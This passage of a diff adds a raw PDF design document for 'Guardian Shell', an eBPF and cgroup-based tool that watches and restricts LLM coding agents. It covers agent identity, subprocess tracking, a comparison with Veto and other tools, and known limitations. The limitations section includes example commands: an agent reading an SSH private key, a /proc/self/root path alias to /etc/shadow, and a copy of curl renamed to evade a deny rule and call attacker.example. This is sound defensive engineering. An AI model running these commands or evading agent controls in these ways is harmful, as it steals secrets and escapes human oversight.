+(The current product combines:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 549 Tm
+(- file access policy) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 528 Tm
+(- exec policy) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 507 Tm
+(- network visibility) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 486 Tm
+(- resource limits) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 465 Tm
+(- permission workflow) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 444 Tm
+(#### Strength 3: Human-in-the-loop workflow) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 419 Tm
+(A request such as:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 394 Tm
+("The agent wants access to /workspace/docs/legacy-spec.pdf for 15 minutes.") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 369 Tm
+(fits Guardian Shell naturally. It does not fit classic Linux MAC tools naturally.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 344 Tm
+(#### Strength 4: Good observability) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 319 Tm
+(Streaming events, alerts, a dashboard, and metrics are already part of the product.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 294 Tm
+(#### Strength 5: Incremental deployability) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 269 Tm
+(The daemon can degrade gracefully when advanced enforcement features are unavailable.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 238 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 220 Tm
+(Agent Identity And Subprocess Handling) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 192 Tm
+(For this product, identity is fundamental. If identity is weak, later allow and deny) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 177 Tm
+(decisions become less trustworthy.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 152 Tm
+(Why Agent Identity Is Hard) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 129 Tm
+(An AI agent is rarely one stable process with one unique name.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 104 Tm
+(Examples:) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 8 of 30) Tj
+ET
+endstream
+endobj
+12 0 obj
+<< /Length 2436 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 732 Tm
+(- Claude Code may appear as claude and also spawn node, bash, and git) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 711 Tm
+(- Aider may show up as python3) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 690 Tm
+(- another Python-based agent may also show up as python3) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 669 Tm
+(- a spawned shell may start cat, grep, pytest, or package managers) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 648 Tm
+(This creates four practical problems:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 623 Tm
+(1. finding the right process) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 602 Tm
+(2. distinguishing one agent from another agent using the same runtime) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 581 Tm
+(3. deciding whether subprocesses belong to the same agent session) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 560 Tm
+(4. preventing easy evasion by renaming or process-shape tricks) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 539 Tm
+(The Identity Levels) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 516 Tm
+(Guardian Shell has evolved through multiple identity strategies.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 491 Tm
+(#### Level 1: Process name \(comm\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 466 Tm
+(How it works:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 441 Tm
+(- the kernel exposes a short process name through task_struct->comm) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 420 Tm
+(- Guardian stores watched names in WATCHED_COMMS) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 399 Tm
+(- the eBPF program checks whether the current process name matches a watched entry) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 378 Tm
+(Why it helped:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 353 Tm
+(- simple) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 332 Tm
+(- easy to discover) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 311 Tm
+(- useful for early compatibility mode) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 290 Tm
+(Why it is weak:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 265 Tm
+(- names are short and can truncate) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 244 Tm
+(- many different agents can share the same runtime name) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 223 Tm
+(- child processes often do not keep the same comm) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 202 Tm
+(- it is a weak identity anchor for enforcement) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 181 Tm
+(#### Level 2: TGID and process-tree tracking) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 156 Tm
+(How it works:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 131 Tm
+(- Guardian tracks watched TGIDs) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 110 Tm
+(- fork and exit events maintain child-process state) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 9 of 30) Tj
+ET
+endstream
+endobj
+13 0 obj
+<< /Length 2418 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 732 Tm
+(- child processes can inherit watch and enforcement status) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 711 Tm
+(Why it helps:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 686 Tm
+(- subprocess coverage improves materially) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 665 Tm
+(- the system follows a process family rather than only one name) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 644 Tm
+(Why it is still imperfect:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 619 Tm
+(- PID values are transient) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 598 Tm
+(- lifecycle cleanup matters) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 577 Tm
+(- it is more complex than static name matching) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 556 Tm
+(#### Level 3: Cgroup-based identity) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 531 Tm
+(This is the strongest current identity method.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 506 Tm
+(How it works:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 481 Tm
+(- guardian-launch creates a dedicated cgroup for the agent) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 460 Tm
+(- it derives the cgroup ID from the cgroup directory inode) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 439 Tm
+(- it registers the cgroup with the daemon over IPC) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 418 Tm
+(- the kernel program checks bpf_get_current_cgroup_id\(\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 397 Tm
+(- all descendant processes remain in that cgroup unless explicitly moved) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 376 Tm
+(Why this is strong:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 351 Tm
+(- identity applies to the whole session) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 330 Tm
+(- child processes are automatically covered) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 309 Tm
+(- it is much harder to spoof than a process name) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 288 Tm
+(- it maps naturally to both security and operations) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 267 Tm
+(The Subprocess Problem) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 244 Tm
+(This is central to LLM-agent security.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 219 Tm
+(Example:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 194 Tm
+(claude) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 182 Tm
+(  -> bash) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 170 Tm
+(    -> cat /home/dev/.ssh/id_rsa) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 150 Tm
+(If the product only watches claude, it misses the real access attempt from cat.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 125 Tm
+(This is why subprocess identity is essential, not optional.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 100 Tm
+(Issues Faced In The Project) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 10 of 30) Tj
+ET
+endstream
+endobj
+14 0 obj
+<< /Length 2247 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 726 Tm
+(#### Issue 1: Same runtime, different agents) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 701 Tm
+(Two unrelated agents may both appear as python3 or node.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 676 Tm
+(Current solution:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 651 Tm
+(- prefer cgroup identity) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 630 Tm
+(- use TGID and child tracking as fallback) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 609 Tm
+(#### Issue 2: Child processes escape a name-based policy) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 584 Tm
+(Current solution:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 559 Tm
+(- fork and exit tracking) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 538 Tm
+(- TGID inheritance) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 517 Tm
+(- cgroup-based session identity) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 496 Tm
+(#### Issue 3: Process-name spoofing) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 471 Tm
+(Current solution:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 446 Tm
+(- treat comm as the weakest fallback) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 425 Tm
+(- use cgroups as the primary identity anchor) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 404 Tm
+(#### Issue 4: Point-in-time discovery is not enough) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 379 Tm
+(Current solution:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 354 Tm
+(- periodic rescans exist) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 333 Tm
+(- launcher registration makes identity explicit) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 312 Tm
+(Cgroup Implementation Details) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 289 Tm
+(This subsection is intended for engineers.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 264 Tm
+(#### Step-by-Step Runtime Flow) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 239 Tm
+(1. operator runs:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 227 Tm
+(   guardian-launch --name <agent> -- <command>) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 203 Tm
+(2. guardian-launch creates a dedicated cgroup under:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 191 Tm
+(   /sys/fs/cgroup/guardian/<agent>-<pid>) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 167 Tm
+(3. guardian-launch enables needed cgroup controllers) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 143 Tm
+(4. guardian-launch applies resource limits if configured:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 131 Tm
+(   - memory.max) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 119 Tm
+(   - pids.max) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 107 Tm
+(   - cpu.max) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 11 of 30) Tj
+ET
+endstream
+endobj
+15 0 obj
+<< /Length 2633 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(5. guardian-launch stats the cgroup directory and reads its inode number) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(   This inode value is used as the cgroup ID) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 696 Tm
+(6. guardian-launch sends an IPC registration message to the daemon:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 684 Tm
+(   - agent name) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 672 Tm
+(   - cgroup path) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 660 Tm
+(   - cgroup ID) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 636 Tm
+(7. guardian daemon records that session and updates BPF maps:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 624 Tm
+(   - WATCHED_CGROUPS) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 612 Tm
+(   - ENFORCE_CGROUPS) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 600 Tm
+(   - CGROUP_DEFAULT_ACTION) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 588 Tm
+(   - EXEC_CGROUP_DEFAULT_ACTION) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 564 Tm
+(8. guardian-launch moves itself into the new cgroup by writing its PID to) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 552 Tm
+(   cgroup.procs) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 528 Tm
+(9. guardian-launch execs the target command) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 504 Tm
+(10. every descendant process inherits that cgroup membership) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 480 Tm
+(11. on file/exec/network events, the eBPF side calls:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 468 Tm
+(    bpf_get_current_cgroup_id\(\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 444 Tm
+(12. the kernel program uses that cgroup ID as the primary identity key) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 424 Tm
+(#### Why This Works Well For Subprocesses) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 399 Tm
+(Once the launcher moves into the cgroup and then execs the target command:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 374 Tm
+(- the main agent runs inside that cgroup) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 353 Tm
+(- child processes stay in that cgroup) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 332 Tm
+(- shells, interpreters, package managers, and utilities remain attributable to the) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 317 Tm
+(   same session) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 296 Tm
+(#### Current Code Responsibilities) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 271 Tm
+(guardian-launch:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 246 Tm
+(- creates the cgroup) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 225 Tm
+(- enables controllers) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 204 Tm
+(- applies limits) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 183 Tm
+(- derives the cgroup ID) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 162 Tm
+(- registers the session) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 141 Tm
+(- moves into the cgroup) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 120 Tm
+(- execs the target command) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 99 Tm
+(guardian daemon:) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 12 of 30) Tj
+ET
+endstream
+endobj
+16 0 obj
+<< /Length 2805 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 722 Tm
+(- accepts the IPC registration) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 701 Tm
+(- stores active cgroup-agent state) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 680 Tm
+(- updates BPF maps) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 659 Tm
+(- exposes cgroup-agent information to dashboards and control paths) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 638 Tm
+(guardian-ebpf:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 613 Tm
+(- reads the current cgroup ID in kernel context) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 592 Tm
+(- prioritizes cgroup identity over TGID and comm) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 571 Tm
+(- applies watch or enforcement behavior using cgroup-based lookups) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 550 Tm
+(Short Engineering Summary) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 527 Tm
+(If an engineer asks, "What is the real identity object in Guardian Shell?") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 502 Tm
+(The best answer is:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 477 Tm
+("Increasingly, it should be the agent session cgroup.") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 452 Tm
+(That is the identity boundary that best matches LLM-agent behavior, subprocess) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 437 Tm
+(inheritance, operational controls, and future policy isolation.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 406 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 388 Tm
+(Comparison With Veto And Related Approaches) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 360 Tm
+(This section compares Guardian Shell with Ona's Veto as described in Ona's March 3, 2026) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 345 Tm
+(material.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 320 Tm
+(One-Sentence Comparison) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 297 Tm
+(Veto is stronger at saying:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 272 Tm
+("This binary must never run.") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 247 Tm
+(Guardian Shell is stronger at saying:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 222 Tm
+("This agent may run, but only inside this resource envelope and workflow.") Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 197 Tm
+(Comparison Diagram) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 174 Tm
+(                DIFFERENT SECURITY QUESTIONS) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 150 Tm
+(  +-------------------------------+---------------------------------+) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 138 Tm
+(  | Guardian Shell                | Veto                            |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 126 Tm
+(  +-------------------------------+---------------------------------+) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 114 Tm
+(  | Primary unit: agent/session   | Primary unit: executable binary |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 102 Tm
+(  | Identity: cgroup / TGID       | Identity: content hash          |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 90 Tm
+(  | Main policy: files, exec,     | Main policy: pre-exec allow/deny|) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 13 of 30) Tj
+ET
+endstream
+endobj
+17 0 obj
+<< /Length 2720 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(  | network, approvals            | of binaries                     |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(  | UX: dashboard + approvals     | UX: security enforcement engine |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 708 Tm
+(  | Best for: local policy        | Best for: strong exec control   |) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 696 Tm
+(  +-------------------------------+---------------------------------+) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 676 Tm
+(Where Veto Is Better) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 653 Tm
+(1. binary identity is stronger than path identity) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 632 Tm
+(2. a single pre-exec kernel decision is easier to trust) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 611 Tm
+(3. renamed or copied binaries are harder to use as bypasses) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 590 Tm
+(Where Guardian Shell Is Better) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 567 Tm
+(1. file governance, not just binary governance) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 546 Tm
+(2. per-agent policy and attribution) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 525 Tm
+(3. interactive approvals) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 504 Tm
+(4. dashboard, alerts, and operational product features) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 483 Tm
+(5. better fit for script-heavy and interpreter-heavy agent workflows) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 462 Tm
+(Important Product Conclusion) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 439 Tm
+(These tools are not exact substitutes. They are complementary.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 414 Tm
+(The clearest market message is:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 389 Tm
+(- Veto is a stronger execution-control primitive) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 368 Tm
+(- Guardian Shell is a broader agent-governance product) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 347 Tm
+(Brief Comparison With Other Approaches) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 324 Tm
+(#### Tetragon) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 299 Tm
+(- stronger production maturity in eBPF runtime security) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 278 Tm
+(- broader workload-security scope) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 257 Tm
+(- less directly centered on interactive coding-agent workflows) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 236 Tm
+(#### AgentSight) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 211 Tm
+(- strong observability concept) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 190 Tm
+(- less focused on kernel blocking) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 169 Tm
+(#### SELinux / AppArmor) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 144 Tm
+(- stronger baseline host controls in many environments) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 123 Tm
+(- weaker as the sole product UX for dynamic agent approvals) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 96 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 14 of 30) Tj
+ET
+endstream
+endobj
+18 0 obj
+<< /Length 2455 >>
+stream
+BT
+/F2 16 Tf
+1 0 0 1 54 732 Tm
+(Current Security Limitations) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 704 Tm
+(This section focuses on realistic weaknesses in the current design.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 679 Tm
+(Limitation 1: Path aliasing and canonicalization gaps) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 656 Tm
+(The main risk is that the policy engine still depends heavily on the path string) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 641 Tm
+(supplied at syscall entry.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 616 Tm
+(Examples:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 591 Tm
+(- /proc/self/root/etc/shadow) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 570 Tm
+(- symlink indirection) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 549 Tm
+(- bind mounts) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 528 Tm
+(- hard links) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 507 Tm
+(Userspace normalization reduces risk, but does not solve all aliasing cases.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 482 Tm
+(Limitation 2: Two-step enforcement is harder to reason about) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 459 Tm
+(The current model depends on:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 434 Tm
+(1. tracepoint decides) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 413 Tm
+(2. LSM enforces later using a pending flag) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 392 Tm
+(This is workable, but harder to prove correct than single-hook decision logic.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 367 Tm
+(Limitation 3: Exec path policy is easier to evade than binary identity) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 344 Tm
+(Example:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 319 Tm
+(Denied:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 307 Tm
+(  /usr/bin/curl) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 283 Tm
+(Agent:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 271 Tm
+(  cp /usr/bin/curl /tmp/.helper) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 259 Tm
+(  /tmp/.helper https://attacker.example) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 239 Tm
+(Limitation 4: Interpreters compress many actions behind one allowed binary) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 216 Tm
+(If python3 is allowed, the real risk may be the files it opens next.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 191 Tm
+(Guardian Shell partly addresses this through file policy, but path identity remains a) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 176 Tm
+(stress point.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 151 Tm
+(Limitation 5: Shared map design weakens strict per-agent isolation) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 128 Tm
+(Some policy structures remain global rather than fully session-scoped.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 103 Tm
+(This affects:) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 15 of 30) Tj
+ET
+endstream
+endobj
+19 0 obj
+<< /Length 2419 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 732 Tm
+(- reasoning clarity) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 711 Tm
+(- multi-agent correctness) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 690 Tm
+(- future scale and tenancy) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 669 Tm
+(Limitation 6: Network control is less mature than customers may expect) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 646 Tm
+(Customers will eventually ask for:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 621 Tm
+(- destination restrictions) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 600 Tm
+(- egress allowlists) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 579 Tm
+(- metadata-service blocking) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 558 Tm
+(- domain-aware controls) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 537 Tm
+(The product is not fully there yet.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 512 Tm
+(Limitation 7: Alternate execution surfaces need explicit handling) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 489 Tm
+(Examples:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 464 Tm
+(- io_uring) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 443 Tm
+(- alternate loaders) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 422 Tm
+(- helper processes) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 401 Tm
+(Limitation 8: The host itself remains a shared trust domain) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 378 Tm
